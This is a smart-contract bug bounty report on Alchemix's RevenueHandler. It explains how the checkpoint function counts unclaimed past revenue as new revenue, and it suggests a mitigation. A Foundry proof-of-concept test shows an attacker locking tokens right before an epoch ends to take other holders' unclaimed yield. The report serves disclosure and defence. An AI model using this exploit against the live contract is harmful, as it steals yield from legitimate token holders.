# 31556 - \[SC - Critical] Unfair Revenue Distribution in Non-Alchemix Rev...

Submitted on May 21st 2024 at 08:51:51 UTC by @Limbooo for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31556

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Introduction

The `RevenueHandler` contract has a critical vulnerability in its `checkpoint` function. This vulnerability specifically affects non-Alchemix revenue tokens, which are held in the contract and distributed directly to `veALCX` holders. The issue arises because the contract calculates revenue for each epoch using the total balance of these tokens, without accounting for unclaimed revenue from previous epochs. This can result in unfair distribution of revenue and potentially allow malicious users to exploit the system to claim more than their fair share of rewards.

## Vulnerability Details

The core issue lies in the `checkpoint` function for non-Alchemix revenue tokens, which are held in the contract rather than swapped for `alAssets`:

```solidity
src/RevenueHandler.sol:
  228:     function checkpoint() public {
  ....
@>245:                 uint256 thisBalance = IERC20(token).balanceOf(address(this));
  246: 
  247:                 // If poolAdapter is set, the revenue token is an alchemic-token
  248:                 if (tokenConfig.poolAdapter != address(0)) {
  ....
  258:                 } else {
  259:                     // If the revenue token doesn't have a poolAdapter, it is not an alchemic-token
@>260:                     amountReceived = thisBalance;
  261: 
  262:                     // Update amount of non-alchemic-token revenue received for this epoch
@>263:                     epochRevenues[currentEpoch][token] += amountReceived;
  264:                 }
  ...
  269:     }
```

This line calculates the revenue based on the total balance of the contract's address, including unclaimed revenues from previous epochs. As a result, the revenue for each new epoch is incorrectly calculated by reusing the entire balance, leading to the following problems:

* **Unfair Revenue Distribution**: Users who delay claiming their rewards allow new users to share in the unclaimed revenue, leading to an inequitable distribution.
* **Exploit Potential**: A malicious user can strategically lock a large amount of tokens just before the end of an epoch and claim a disproportionate share of the total revenue, including unclaimed amounts from previous epochs.

## Impact Details

The potential losses and impacts from this vulnerability include:

* **Unfair Distribution**: Users who participate early receive fewer rewards than expected, as their share is diluted by unclaimed balances.
* **Exploit by Malicious Users**: Users can exploit the system by locking large amounts just before epoch transitions, claiming a large share of total revenues, including unclaimed previous revenues.
* **Financial Imbalance**: Continuous unfair distribution can lead to significant financial imbalance, depleting the treasury or other revenue sources, and potentially threatening the protocol’s sustainability.

## Mitigation Analysis

To mitigate this vulnerability, the `checkpoint` function needs to be revised to accurately track and calculate the revenue generated in each epoch. The correct approach should involve:

1. Tracking deposits and withdrawals separately for each epoch.
2. Calculating the new revenue by subtracting last epoch revenues (excluding its withdrawals (claims)) from the current balance to ensure only the new revenue is distributed.

## Proof of Concept

The test can be added to a new file under the current test suite `src/test/RevenueHandlerPoC.t.sol`, then specify the file name in `FILE` flag under `Makefile` configuration. Run using `make test_file`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.sol";
import "lib/v2-foundry/src/interfaces/IWhitelist.sol";

contract RevenueHandlerPoCTest is BaseTest {

    address public alice;
    address public bob;
    address public eve;

    IWhitelist public whitelist = IWhitelist(0x78537a6CeBa16f412E123a90472C6E0e9A8F1132);

    /// @dev Deploy the contract
    function setUp() public {
        setupContracts(block.timestamp);

        // The issue is only appears for Non Alchemix revenue token
        // So we will add a revenue token that dose not uses an alAsset
        // Which will be distributed directly, like Aura/BAL.
        hevm.prank(admin);
        revenueHandler.addRevenueToken(bal);

        // whitelist revenueHandler,
        hevm.prank(devmsig);
        whitelist.add(address(revenueHandler));

        // Setup addresses
        alice = _makeAddr('Alice');
        bob = _makeAddr('bob');
        eve = _makeAddr('Eve');
    }


    function testRevenuesDiscrepancyOnNonAlchemicRevenue() public {
        uint256 period = minter.activePeriod();
        uint256 revAmt = 10e20; // 1000.0
        uint256 lockAmt = 10e18; // 10.0

        // Start of the first epoch
        hevm.warp(period + 1);
        // voter.distribute();

        // Alice start locking a postion.
        uint256 aliceTokenId = _initializeVeALCXPosition(alice, lockAmt);

        // First revenue distrbution.
        _accrueRevenue(bal, revAmt);
        uint256 revenueHandlerBalance1 = IERC20(bal).balanceOf(address(revenueHandler));
        assertEq(revenueHandlerBalance1, revAmt, "evenueHandler balance should be equal to revAmt");

        // Wrap to next epoch.
        hevm.warp(period + 2 weeks + 1);
        hevm.roll(block.number + (2 weeks / 12));
        // Checkpoint last epoch revenues
        voter.distribute();

        // Alice claimable amount should equal to the whole revenue amount.
        uint256 aliceClaimableAmt = revenueHandler.claimable(aliceTokenId, bal);
        assertEq(aliceClaimableAmt, revAmt, "claimable amount for alice should be equal to revAmt");

        // However, alice dose not claime his revenue.
        // Now another user start a new postion wiht same alice lock amount, Bob.
        uint256 bobTokenId = _initializeVeALCXPosition(bob, lockAmt);


        // Second revenue distrbution.
        _accrueRevenue(bal, revAmt);
        uint256 revenueHandlerBalance2 = IERC20(bal).balanceOf(address(revenueHandler));
        assertEq(revenueHandlerBalance2, revAmt * 2, "evenueHandler balance should be equal to revAmt * 2");

        // Wrap to next epoch.
        hevm.warp(period + 4 weeks + 1);
        hevm.roll(block.number + (2 weeks / 12)); // we need to update extra blocks only (2 weeks added)
        // Checkpoint last epoch revenues
        voter.distribute();

        // Alice claimable amount should equal to the whole revenue amount of first distrbution,
        // plus half of the second evenue amount, since bob is sharing half with him.
        // However, Alice has more (approximately the whole revenues from the first and second distrbution),
        // and if he claim, bob will not able to claim his revenue.
        aliceClaimableAmt = revenueHandler.claimable(aliceTokenId, bal);
        // assertEq(aliceClaimableAmt, revAmt + revAmt/2, "claimable amount for alice should be equal to revAmt * 1.5");
        assertApproxEq(aliceClaimableAmt, revAmt * 2, 25e18); // max delta is round 25.0 out of 2000.0

        // Also, Bob has approximately the half of revenues for both first and secound distrbution,
        // While he should only has half of the revenue of the second distrbution.
        uint256 bobClaimableAmt = revenueHandler.claimable(bobTokenId, bal);
        // assertEq(bobClaimableAmt, (revAmt*2) /2, "claimable amount for alice should be equal to revAmt");
        assertApproxEq(bobClaimableAmt, revAmt, 26e18); // max delta is round 26.0 out of 2000.0

        // This is happens because `revenueHandler.checkpoint()` account for current balance of `BAL` 
        // without taking into account that part of the balance belongs to previous epochs that unclaimed yet
        assertEq(revenueHandler.epochRevenues(period + 4 weeks, bal), revAmt * 2);


        // However, if a malicious user knows that, he can takes the opportunity and exploit it
        // Eve attacks and steal all unclaimed revenues:
        // Right before the end of the epoch, he start a lock with high amount.
        hevm.warp(period + 6 weeks - 1);
        hevm.roll(block.number + (2 weeks / 12));
        uint256 eveTokenId = _initializeVeALCXPosition(eve, lockAmt * 2);
        // Wrap to next epoch.
        hevm.warp(period + 6 weeks + 1);
        // Checkpoint last epoch revenues
        voter.distribute();

        // Now, after little time of his lock start, Eve can claim half of the whole revenues
        // Since has locks amount equals to alice's locks plus bob's locks
        uint256 eveClaimableAmt = revenueHandler.claimable(eveTokenId, bal);
        assertApproxEq(eveClaimableAmt, revAmt * 2 /2, 51e18);

        hevm.prank(eve);
        revenueHandler.claim(eveTokenId, bal, address(0), eveClaimableAmt, eve);


        // Now, if alice or bob try to claim
        // it will revert
        aliceClaimableAmt = revenueHandler.claimable(aliceTokenId, bal);
        hevm.prank(alice);
        hevm.expectRevert(abi.encodePacked('Not enough revenue to claim'));
        revenueHandler.claim(aliceTokenId, bal, address(0), aliceClaimableAmt, alice);
    }

    // Helper functions
    function _makeAddr(string memory name) internal returns(address addr){
        addr = hevm.addr(uint256(keccak256(abi.encodePacked(name))));
        vm.label(addr, name);
    }

    function _initializeVeALCXPosition(address owner, uint256 amount) internal returns (uint256 tokenId) {
        veALCX.checkpoint();
        tokenId = _lockVeALCX(owner, amount);
    }

    function _lockVeALCX(address owner, uint256 amount) internal returns (uint256 tokenId) {
        deal(address(bpt), owner, amount);
        hevm.startPrank(owner);
        IERC20(bpt).approve(address(veALCX), amount);
        tokenId = veALCX.createLock(amount, MAXTIME, false);
        hevm.stopPrank();
    }

    function _accrueRevenue(address token, uint256 amount) internal {
        deal(token, address(this), amount);
        IERC20(token).transfer(address(revenueHandler), amount);
    }
}
```
